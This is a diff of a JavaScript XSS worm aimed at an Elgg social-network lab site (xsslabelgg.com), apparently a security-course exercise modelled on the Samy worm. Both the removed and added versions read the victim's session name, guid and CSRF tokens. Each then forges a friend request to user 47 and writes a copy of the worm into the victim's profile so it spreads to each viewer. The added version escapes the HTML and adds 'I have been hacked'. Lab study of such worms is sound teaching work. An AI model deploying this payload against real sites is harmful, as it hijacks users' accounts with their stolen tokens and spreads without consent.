@@ -1,40 +1,33 @@
-<script id="worm">
 window.onload = function(){
-    // 获取用户信息和安全令牌
-    var userName = elgg.session.user.name;
-    var guid = "&guid=" + elgg.session.user.guid; 
-    var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
-    var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
-    
-    // 获取Samy的guid
-    var samyGuid = 47; // Samy的用户ID
-    
-    // 如果当前用户不是Samy
-    if(elgg.session.user.guid != samyGuid) {
-        // 准备添加好友的请求
-        var sendurl = "http://www.xsslabelgg.com/action/friends/add?friend=" + samyGuid + ts + token;
-        
-        // 发送添加好友请求
-        var Ajax = new XMLHttpRequest();
-        Ajax.open("GET", sendurl, true);
-        Ajax.send();
-        
-        // 获取蠕虫代码
-        var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
-        var jsCode = document.getElementById("worm").innerHTML;
-        var tailTag = "</" + "script>";
-        var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
-        
-        // 准备个人资料更新内容
-        var content = "name=" + userName + "&description=" + wormCode + 
-                     "&accesslevel[description]=2" + guid + ts + token;
-                     
-        // 发送更新个人资料请求     
-        var Ajax2 = new XMLHttpRequest();
-        Ajax2.open("POST","http://www.xsslabelgg.com/action/profile/edit", true);
-        Ajax2.setRequestHeader("Content-Type",
-                             "application/x-www-form-urlencoded");
-        Ajax2.send(content);
-    }
+
+var userName = elgg.session.user.name;
+var guid = &quot;&amp;guid=&quot; + elgg.session.user.guid;
+var ts = &quot;&amp;__elgg_ts=&quot; + elgg.security.token.__elgg_ts;
+var token = &quot;&amp;__elgg_token=&quot; + elgg.security.token.__elgg_token;
+
+var samyGuid = 47;
+
+if(elgg.session.user.guid != samyGuid) {
+
+var sendurl = &quot;http://www.xsslabelgg.com/action/friends/add?friend=&quot; + samyGuid + ts + token;
+
+
+var Ajax = new XMLHttpRequest();
+Ajax.open(&quot;GET&quot;, sendurl, true);
+Ajax.send();
+
+var headerTag = &quot;&quot;;
+var jsCode = document.getElementById(&quot;worm&quot;).innerHTML;
+var tailTag = &quot;&lt;/&quot; + &quot;script&gt;&quot;;
+var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
+
+var content = &quot;name=&quot; + userName + &quot;&amp;description=I have been hacked&quot; + wormCode +
+&quot;&amp;accesslevel[description]=2&quot; + guid + ts + token;
+
+
+var Ajax2 = new XMLHttpRequest();
+Ajax2.open(&quot;POST&quot;,&quot;http://www.xsslabelgg.com/action/profile/edit&quot;, true);
+Ajax2.setRequestHeader(&quot;Content-Type&quot;,
+&quot;application/x-www-form-urlencoded&quot;);
+Ajax2.send(content);
 }
-</script>
